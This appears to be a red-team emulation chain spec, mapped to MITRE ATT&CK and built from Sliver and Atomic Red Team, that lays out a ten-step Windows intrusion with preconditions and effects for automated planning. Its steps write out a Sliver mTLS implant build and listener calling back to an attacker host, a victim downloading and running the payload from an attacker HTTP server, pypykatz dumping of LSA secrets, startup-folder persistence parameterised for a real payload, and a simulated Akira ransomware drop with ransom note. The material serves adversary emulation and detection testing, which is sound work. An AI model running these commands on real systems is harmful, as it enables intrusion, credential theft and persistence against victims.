# Chain 053

**Testbed**: `env0` · **Steps**: 10 · **Tactics touched**: Command and Control, Execution, Discovery, Credential Access, Persistence, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Execution | T1204.002, T1059.001 |
| Discovery | T1087.001 |
| Credential Access | T1003.002 |
| Persistence | T1547.001 |
| Impact | T1486 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 2 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file | Human |
| 3 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 4 | Discovery | T1087.001 | User Context Verification | Sliver Executor |
| 5 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file as Admin (Root) | Human |
| 6 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 7 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 8 | Credential Access | T1003.002 | Registry parse with pypykatz | Powershell Executor |
| 9 | Persistence | T1547.001 | Add Executable Shortcut Link to User Startup Folder | Powershell Executor |
| 10 | Impact | T1486 | Akira Ransomware drop Files with .akira Extension and Ransomnote | Powershell Executor |

## Attack Steps (Detail)

### Step 1 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download and execute malicious payload file

- **UUID**: `simulate-download-execute-file`
- **Source**: Manual
- **Supported platforms**: windows, linux
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:8000 in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} (If on a Linux machine, you also need to chmod the file)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed ?file - file ?target - host)`

---

### Step 3 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 4 — User Context Verification

- **UUID**: `sliver-whoami`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Discovery
- **MITRE ID(s)**: T1087.001
- **Technique(s)**: Account Discovery: Local Account


**Description**

The `whoami` command retrieves the current user identity of the system. It executes the command on the remote system and returns the username of the account that is currently logged in. This command includes flag for setting a timeout.

**Execution** (Sliver Executor)

```
whoami(session_id=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(local-account-info-known ?target - host)`

---

### Step 5 — Simulate the victim download and execute malicious payload file as Admin (Root)

- **UUID**: `simulate-download-execute-file-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} as Admin (Root)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 6 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 7 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 8 — Registry parse with pypykatz

- **UUID**: `art-t1003_002-pypykatz-live-lsa`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.002
- **Technique(s)**: OS Credential Dumping: Security Account Manager

**Description**

`pypykatz live lsa` reads live LSA / SAM state and prints hashes and
cached secrets to stdout. Method 3 folds the heavy prereq chain
(install Python, create venv, pip install pypykatz) — this fold is
expensive on first run; realistic simulation envs would pre-provision
Python. ART auto_generated_guid a96872b2-cbf3-46cf-8eb4-27e8c0e85263.

**Execution** (Powershell Executor)

```
$venv = "#{venv_path}"
if (-not (Test-Path "$venv\Scripts\pypykatz.exe")) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  if (-not (Get-Command py -ErrorAction Ignore)) {
    $pySetup = "$env:TEMP\python_setup.exe"
    Invoke-WebRequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -OutFile $pySetup
    Start-Process $pySetup -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1' -Wait
  }
  py -m venv $venv
  & "$venv\Scripts\pip.exe" install --no-cache-dir pypykatz | Out-Null
}
& "$venv\Scripts\pypykatz.exe" live lsa
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke pypykatz. | — | yes |
| `venv_path` | Target-side path to a Python venv containing pypykatz. | C:\\Users\\Public\\venv_pypykatz | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-c2 ?d - data)`

---

### Step 9 — Add Executable Shortcut Link to User Startup Folder

- **UUID**: `art-t1547_001-startup-folder-lnk`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1547.001
- **Technique(s)**: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

**Description**

File-based Startup persistence: creates a `.lnk` shortcut in the
current user's `Startup` folder pointing at the chosen executable.
Native Windows shell (WScript.Shell) — no external binary. Original
ART test hardcodes calc.exe as the target; parameterised here so
operators can substitute a real payload. ART auto_generated_guid
24e55612-85f6-4bd6-ae74-a73d02e3441d.

**Execution** (Powershell Executor)

```
$Target = "#{target_path}"
$ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\#{shortcut_name}"
$WScriptShell = New-Object -ComObject WScript.Shell
$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
$Create.TargetPath = $Target
$Create.Save()
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to create the .lnk file. | — | yes |
| `target_path` | Full path to the executable the shortcut launches at login. | C:\\Windows\\System32\\calc.exe | yes |
| `shortcut_name` | Filename of the .lnk placed under the Startup folder. | ArtPersist.lnk | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(command-execution-at-startup ?c - string ?target - host)`

---

### Step 10 — Akira Ransomware drop Files with .akira Extension and Ransomnote

- **UUID**: `art-t1486-akira-ransomware-sim`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Impact
- **MITRE ID(s)**: T1486
- **Technique(s)**: Data Encrypted for Impact

**Description**

Simulates Akira ransomware post-encryption artefacts: writes 100
random-byte 1MB files with `.akira` extension to `C:\` and drops a
ransom note on the user's Desktop. Does not actually encrypt user
data — models the observable trail an incident responder would find.
Under aurora's "technique-attempted" positioning we accept this as
`data-encrypted` (the .akira files are the encrypted artefact from
the model's point of view). ART auto_generated_guid
ab3f793f-2dcc-4da5-9c71-34988307263f.

**Execution** (Powershell Executor)

```
1..#{file_count} | ForEach-Object {
  $out = New-Object byte[] 1073741
  (New-Object Random).NextBytes($out)
  [IO.File]::WriteAllBytes("#{output_dir}\test.$_.akira", $out)
}
"Hi friends" | Out-File -Append "$env:UserProfile\Desktop\#{ransom_note_name}"
"Your files have been encrypted." | Out-File -Append "$env:UserProfile\Desktop\#{ransom_note_name}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to drop the .akira files and ransom note. | — | yes |
| `file_count` | Number of .akira artefact files to drop. | 100 | yes |
| `output_dir` | Target-side directory where .akira files are written. | C:\\Users\\Public | yes |
| `ransom_note_name` | Ransom-note filename dropped on the user's desktop. | akira_readme.txt | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(data-encrypted ?d - data ?target - host)`

---
